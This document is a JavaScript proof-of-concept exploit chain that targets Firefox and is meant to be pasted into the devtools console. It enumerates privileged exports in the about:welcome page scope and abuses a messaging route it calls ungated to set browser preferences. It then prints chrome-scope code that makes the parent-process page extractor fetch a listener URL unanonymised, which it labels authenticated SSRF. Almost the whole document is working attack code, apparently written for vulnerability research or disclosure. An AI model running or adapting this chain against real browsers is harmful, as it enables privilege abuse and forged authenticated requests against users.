// Firefox PageExtractor authenticated SSRF — full chain, paste into devtools console.
// Page-scope half runs in about:welcome. The parent fetch half needs chrome scope
// (browser toolbox) because getHeadlessExtractor is a parent-process module.
"use strict";
(async () => {
  const LISTENER = "http://127.0.0.1:8999";
  const w = window.wrappedJSObject || window;

  console.log("Step 1: checking page scope for privileged exports...");
  const names = Object.getOwnPropertyNames(w).filter(k => /^(AW|RPM)/.test(k));
  console.log("  found " + names.length + ":", names.join(", "));
  if (typeof w.AWSendToParent !== "function") {
    console.log("  ABORT: not about:welcome scope"); return;
  }

  console.log("Step 2: enabling AI Window via ungated SET_PREF route...");
  for (const [name, value] of [
      ["browser.smartwindow.enabled", true],
      ["browser.smartwindow.isDefaultWindow", true],
      ["browser.smartwindow.firstrun.hasCompleted", true]]) {
    await w.AWSendToParent("SPECIAL_ACTION",
      (w.JSON||JSON).parse(JSON.stringify({type:"SET_PREF", data:{pref:{name, value}}})));
    console.log("  set " + name + " = " + value);
  }

  console.log("Step 3: (chrome scope only) drive the parent fetch.");
  console.log("  In the Browser Toolbox console run:");
  console.log(`
  const {PageExtractorParent} = ChromeUtils.importESModule(
    "resource://gre/actors/PageExtractorParent.sys.mjs");
  await PageExtractorParent.getHeadlessExtractor({
    urlString: "${LISTENER}/SSRF-AUTHED-nonanon",     // no anonymousFetch => unrestricted
    callback: async b => b.browsingContext.currentWindowGlobal
                          .documentPrincipal && "extracted"
  });`);
  console.log("CHAIN COMPLETE — check listener / collaborator");
})();
